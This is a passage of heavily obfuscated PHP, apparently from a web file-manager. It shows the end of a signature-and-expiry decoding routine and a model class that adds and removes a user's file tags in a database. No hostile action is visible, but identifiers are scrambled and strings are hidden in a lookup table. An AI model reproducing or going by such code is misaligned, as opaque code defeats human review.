$a¦‚ŸèÕ¹¨[$dŸ‹…Æ¤Ê°]) % 256]); } $FÂµçîÕĞ = intval(substr($A‰Éù·‡Ç, 0, 10)); goto cù…ÓçìØÔ; cù…ÓçìØÔ: if (($FÂµçîÕĞ == 0 || $FÂµçîÕĞ - time() > 0) && substr($A‰Éù·‡Ç, 10, 16) == substr(md5(substr($A‰Éù·‡Ç, 26) . $A´Şå£™îù), 0, 16)) { return substr($A‰Éù·‡Ç, 26); } else { return $c´¦‡™¤•[33]; } goto CĞŠ”¶Í˜¾; CĞŠ”¶Í˜¾: } } define($_SERVER[Ö][1905], 1); goto däŸš‘Î; D½˜¾Ì‹: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($DæÊ½£áïá) { $f™äÙ±¦·” =& $_SERVER[Ö]; return array($f™äÙ±¦·”[2458] => array(USER_ID, $f™äÙ±¦·”[2514])); } protected function listData() { $FøÒ–Ñˆ =& $_SERVER[Ö]; $f—å–ŸçÈ = array($FøÒ–Ñˆ[1405] => USER_ID, $FøÒ–Ñˆ[432] => array($FøÒ–Ñˆ[2515], 0)); $f•ƒ¦å… = $FøÒ–Ñˆ[2516]; $aá—‘õùä = $FøÒ–Ñˆ[2517]; $bÃ¶é±Ìòš = $this->field($f•ƒ¦å…)->where($f—å–ŸçÈ)->order($aá—‘õùä)->select(); return $bÃ¶é±Ìòš ? $bÃ¶é±Ìòš : array(); } protected function listByTag($aÉÅŞİŸ”Ä) { } protected function addToTag($ašŒ©Œ¡”¸, $C¾àøà¾Üµ) { $e“º§ãäÕ =& $_SERVER[Ö]; if (!Model($e“º§ãäÕ[2285])->listData($C¾àøà¾Üµ) || !Model($e“º§ãäÕ[745])->pathInfo($ašŒ©Œ¡”¸)) { return !1; } $FŒ Ò´´¢  = array($e“º§ãäÕ[1405] => USER_ID, $e“º§ãäÕ[432] => $C¾àøà¾Üµ, $e“º§ãäÕ[383] => $ašŒ©Œ¡”¸, $e“º§ãäÕ[384] => $e“º§ãäÕ[378], $e“º§ãäÕ[382] => $e“º§ãäÕ[33], $e“º§ãäÕ[2081] => 0); if ($this->where($FŒ Ò´´¢ )->find()) { return !1; } return $this->add($FŒ Ò´´¢ ); } protected function removeFromTag($Cåö¦Í÷öâ, $E·åÇñÀŸŒ) { $eçªŒ÷çè… =& $_SERVER[Ö]; if (!Model($eçªŒ÷çè…[2285])->listData($E·åÇñÀŸŒ)) { return !1; } if (is_array($Cåö¦Í÷öâ)) { $Cåö¦Í÷öâ = array($eçªŒ÷çè…[7], $Cåö¦Í÷öâ); } $c—Öæ®‡ç‹ = array($eçªŒ÷çè…[1405] => USER_ID, $eçªŒ÷çè…[432] => $E·åÇñÀŸŒ, $eçªŒ÷çè…[384] => $eçªŒ÷çè…[378], $eçªŒ÷çè…[383] => $Cåö¦Í÷öâ); return $this->where($c—Öæ®‡ç‹)->delete(); } protected function removeByTag($DÑ’ãì¡ñÕ) { $C¯ì¯èåÂå =& $_SERVER[Ö]; if (!$DÑ’ãì¡ñÕ) { return !1; } $FÃ¿Å£íƒó = array($C¯ì¯èåÂå[1405] => USER_ID, $C¯ì¯èåÂå[432] => $DÑ’ãì¡ñÕ); return $this->where($FÃ¿Å£íƒó)->delete(); } protected function removeBySource($DØóğ†°ê±) { $a’ÑŞæ  =& $_SERVER[Ö]; $a†ò°Ÿ§²µ = array($a’ÑŞæ [1405] => USER_ID, $a’ÑŞæ [383] => $DØóğ†°ê±, $a’ÑŞæ [432] => array($a’ÑŞæ [923], 0)); return $this->where($a†ò°Ÿ§²µ)->delete(); } }